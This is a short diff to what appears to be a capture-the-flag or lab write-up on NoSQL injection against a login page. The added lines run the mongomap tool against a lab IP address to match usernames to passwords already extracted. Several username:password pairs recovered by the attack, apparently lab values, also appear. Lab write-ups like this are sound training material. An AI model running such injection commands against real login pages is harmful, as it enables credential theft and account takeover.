@@ -243,7 +243,10 @@ ROpPXouppjXNf2pmmT0Q
 UZbIt6L41BmLeQJF0gAR
 WmLP5OZDiLos16Ie1owB
 ```
-We have quite the disparity between usernames (7) and passwords (16).  Either the script is bugged, or I've got 9 usernames unaccounted for.  Maybe we need to try a different tool; another one I came across was https://github.com/Hex27/mongomap.
+We have quite the disparity between usernames (7) and passwords (16).  Either the script is bugged, or I've got 9 usernames unaccounted for.  Maybe we need to try a different tool; another one I came across was https://github.com/Hex27/mongomap.  Let's use it to match usernames to the known passwords.
+```
+python mongomap.py -u "http://10.10.223.198:8080/login.php/" --method post --data "username=1&password=$KNOWN_PASSWORD" -p username
+```
 ```
 Blizzardson:h1y6zpVTOwGYoB95aRnk
 Frostbite:WmLP5OZDiLos16Ie1owB
